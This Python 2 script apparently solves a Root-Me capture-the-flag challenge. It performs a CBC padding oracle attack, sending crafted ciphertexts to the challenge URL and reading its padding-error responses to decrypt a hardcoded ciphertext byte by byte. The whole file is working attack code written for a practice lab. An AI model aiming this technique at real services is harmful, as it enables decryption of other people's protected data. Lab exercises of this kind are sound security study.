# encoding: utf-8
import logging

import itertools
from enum import Enum

from leak.base import RegexParser
from leak.leak import HTTPLeaker


#logging.basicConfig()


def hexify(msg):
    return ''.join(['%02x' % ord(_) for _ in msg])

def dehexify(msg):
    return ''.join([chr(int(msg[2*_:2*(_ + 1)], 16)) for _ in xrange(0, len(msg)/2)])

# https://stackoverflow.com/questions/4815792/loop-over-2-lists-repeating-the-shortest-until-end-of-longest
def xor(a, b):
    r'''
        >>> xor('\xff', '\xff')
        '\x00'
        >>> xor('\x00\xff', '\x00')
        '\x00\xff'
        >>> xor('\x00\x41\x42', '\x00\x41\x42')
        '\x00\x00\x00'
    '''
    return ''.join([
        chr(ord(x)^ord(y)) for x, y in zip(a, itertools.cycle(b))
    ])


class RedPillsParser(RegexParser):
    def __init__(self):
        super(RedPillsParser, self).__init__(pattern=r'.*((?P<success><h2>Home</h2>)|(?P<file><h2>File not found</h2>)|(?P<padding_error><h2>Server Error: Padding Error</h2>).*)')


class CBCPaddingOracle(HTTPLeaker):
    class State(Enum):
        ORIGINAL_PADDING_FINDING = 0
        BYTE_RETRIEVAL           = 1

    def __init__(self, **kwargs):
        super(CBCPaddingOracle, self).__init__(parser=RedPillsParser(), **kwargs)

        self.ciphertext = dehexify('E5D68870EB5626D54D4F12F2A5EA2F80550CF3C11CF45ED978C5CD8155724490')

        self.state.update({
            'original_ciphertext': self.ciphertext,
            'total_length':        len(self.ciphertext),
            #'original_ciphertext': '78152889BDF27A930F14742DBB54A6DECE87A24713B30B76987D2A87DD9D6C52FA1A6B697D62000332F435B99D8371DD', # about us
            'block_length': 16,
            'state': self.State.ORIGINAL_PADDING_FINDING,
            'idx': 0,
        })

        self.logger.info('we start with a message of %d bytes' % (len(self.ciphertext)))

    def update_mask(self):
        '''
        This function is called when we have a known padding and we want to update it
        to the next in order to start the guessing for the next byte.

        It updates the "mask" of the state. The mask is used for the total length
        of the ciphertext.
        '''
        padding = self.state['idx']
        mask = self.state['mask']

        # the mask acts on the evil block
        block_start_offset, block_end_offset = self.evil_block_range
        block_start_offset = block_end_offset - padding

        xored_new_padding = xor(chr(padding), chr(padding + 1))

        self.logger.debug('mask before %s' % hexify(mask))
        self.state['mask'] = mask[:block_start_offset] + xor(mask[block_start_offset:block_end_offset], xored_new_padding) + mask[block_end_offset:]

        self.logger.debug('mask after  %s' % hexify(self.state['mask']))

        '''we update the index of the byte we are looking for'''
        self.state['idx'] += 1
        self.state['mask_byte'] = '\x00'

    def update(self):
        state = self.state['state']

        padding_error = self._leak['padding_error']
        success       = self._leak['success']
        file          = self._leak['file']

        if state == self.State.ORIGINAL_PADDING_FINDING:
            # we are starting from the leftest byte and increasing the index
            # until we obtain a padding error
            if file:
                self.state['idx'] += 1
            elif padding_error:
                self.logger.info('padding starts at offset %d' % (self.block_offset(self.blocks_number - 2) + self.state['idx']))

                self.logger.info(' %s -> %s' % (self.State.ORIGINAL_PADDING_FINDING, self.State.BYTE_RETRIEVAL))

                self.state['state'] = self.State.BYTE_RETRIEVAL

                padding = self.state['block_length'] - self.state['idx']  # this index is from the tail of the string
                self.state['idx']   = padding # idx will memorize the last value of padding correctly decoded

                self.state['mask'] = '\x00' * self.state['total_length']

                self.update_mask()

            elif success:
                raise ValueError('this is bad my friend')

        # now we are trying to bruteforce the padding bytes: we are starting with a know padding
        # from the previous stage and then XORing one byte at the times incrementally
        # when we reach the 'file not found message' means we have guessed right one byte.
        elif state == self.State.BYTE_RETRIEVAL:
            if padding_error:
                # try another byte
                b = ord(self.state['mask_byte']) + 1

                if b > 0xff:
                    raise ValueError('You exceeded the allowed values')

                self.state['mask_byte'] = chr(b)
                self.logger.debug('trying with mask byte %s' % hexify(self.state['mask_byte']))
            elif file:
                self.logger.info('with 0x%s it\'s ok' % hexify(self.state['mask_byte']))
                self.logger.info('decoded -> %s' % xor(chr(self.state['idx']), self.state['mask_byte']))

                if self.state['idx'] == self.state['block_length']:
                    raise

                self.update_mask()

    def get_requests_method(self):
        return 'GET'

    def get_requests_data(self):
        return {}

    def has_finished(self):
        return False

    @property
    def blocks_number(self):
        return len(self.state['original_ciphertext'])/self.state['block_length']

    def block_offset(self, n):
        assert n >= 0
        assert n <= (self.blocks_number - 1)

        return  self.state['block_length'] * n

    @property
    def evil_block_range(self):
        start_block_offset = self.block_offset(self.blocks_number -2)

        return start_block_offset, start_block_offset + self.state['block_length']

    def get_requests_params(self):
        ciphertext = self.state['original_ciphertext']

        if self.state['state'] == self.State.ORIGINAL_PADDING_FINDING:
            # first of all we find the offset of the block before the last
            idx = (self.block_offset(self.blocks_number - 2) + self.state['idx'])
            ciphertext = ciphertext[:idx] + '\x00' + ciphertext[idx + 1:]
        elif self.state['state'] == self.State.BYTE_RETRIEVAL:
            # here there is the real juice: we modify the original second-last
            # block
            self.logger.info('probing %d-th byte' % self.state['idx'])

            mask = self.state['mask']

            # update the mask with the new guessing byte
            start, end = self.evil_block_range
            idx = end - self.state['idx']
            self.state['mask'] = mask[:idx] + self.state['mask_byte'] + mask[idx + 1:]

            ciphertext = xor(ciphertext, self.state['mask'])

        return {
            'c': hexify(ciphertext),
        }

    def get_requests_url(self):
        return 'http://challenge01.root-me.org/realiste/ch12/index.aspx'


if __name__ == '__main__':
    leaker = CBCPaddingOracle()

    print leaker()